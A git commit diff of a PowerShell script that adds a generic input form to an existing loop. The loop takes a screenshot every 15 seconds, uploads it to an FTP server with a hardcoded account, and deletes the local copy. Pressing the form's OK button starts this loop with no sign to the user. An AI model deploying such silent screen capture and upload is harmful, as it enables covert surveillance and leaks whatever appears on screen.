eb58ab8ab1e92e31e6d5cb0c95b5dad188d88f39
picarenlamina <116097495+picarenlamina@users.noreply.github.com>
2024-03-07 12:47:46 +0100

    Update pantalla.ps1

--- pantalla.ps1
+++ pantalla.ps1
@@ -1,6 +1,21 @@
- while( 1 )
+
+Function crearCarpeta {
+ param( $carpeta )
+
+
+    $fso = New-Object -ComObject Scripting.FileSystemObject
+    $fso.CreateFolder('C:\temp\' + $carpeta )
+
+}
+
+# Upload ficheros servidor ftp
+Function upload {
+    param( $prefijo )
+
+    
+   while( 1 )
    {
-    $file = (Get-Date).ToString("yyyyMMddhhmm")+".bmp"
+    $file = $prefijo + (Get-Date).ToString("yyyyMMddhhmm")+".bmp"
     $path="c:\temp\"
     $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
     $g=[System.Drawing.Graphics]::FromImage($b)
@@ -10,7 +25,7 @@
 
 
     $user = "u46609125-frm"
-    $password = "*****"
+    $password = "******"
 
     $client = New-Object System.Net.WebClient
     $client.Credentials = New-Object System.Net.NetworkCredential($user, $password)
@@ -19,4 +34,73 @@
     $archive =  $path + $file   
     Remove-Item -Path  $archive –recurse
     Start-Sleep -s 15
+    }
+   
+
+
+
+
+
 }
+
+
+
+
+
+
+
+
+
+#Formulario
+$Form = New-Object System.Windows.Forms.Form
+$Form.Text="Formulario"
+$Form.Size=New-Object System.Drawing.Size(500,500)
+$Form.StartPosition="CenterScreen"
+ 
+#Etiqueta
+$Label=New-Object System.Windows.Forms.Label
+$Label.Text="Etiqueta de ejemplo"
+$Label.AutoSize=$True
+$Label.Location=New-Object System.Drawing.Size(160,160)
+ 
+#Caja de texto
+$TextBox = New-Object System.Windows.Forms.TextBox
+$TextBox.Location = New-Object System.Drawing.Size(100,180)
+$TextBox.Size = New-Object System.Drawing.Size(260,20)
+ 
+#Botón1
+$Button1=New-Object System.Windows.Forms.Button
+$Button1.Size=New-Object System.Drawing.Size(75,23)
+$Button1.Text="Botón OK"
+$Button1.Location=New-Object System.Drawing.Size(120,220)
+ 
+#Botón2
+$Button2=New-Object System.Windows.Forms.Button
+$Button2.Size=New-Object System.Drawing.Size(75,23)
+$Button2.Text="Botón Cancelar"
+$Button2.Location=New-Object System.Drawing.Size(220,220)
+ 
+#Funcionalidad para el formulario:
+#Pulsar la tecla Enter almacena en una variable el contenido de la caja de texto y se muestra
+#Pulsar la tecla Escape sale del formulario
+$Form.KeyPreview = $True
+$Form.Add_KeyDown({if ($_.KeyCode -eq "Enter"){$Var=$TextBox.Text;Write-Host $Var;$Form.Close()}})
+$Form.Add_KeyDown({if ($_.KeyCode -eq "Escape"){$Form.Close()}})
+ 
+#Funcionalidad para el botón:
+#Pulsar Enter almacena en una variable el contenido de la caja de texto y se muestra
+#Pulsar Escape sale del formulario
+$Button1.Add_Click({$Var=$TextBox.Text; $Form.Close() ;upload -prefijo $Var })
+$Button2.Add_Click({$Form.Close()})
+ 
+#Añadir etiqueta
+$Form.Controls.Add($Label)
+ 
+#Añadir botones
+$Form.Controls.Add($Button1)
+$Form.Controls.Add($Button2)
+ 
+#Añadir caja de texto
+$Form.Controls.Add($TextBox)
+ 
+$Form.ShowDialog()
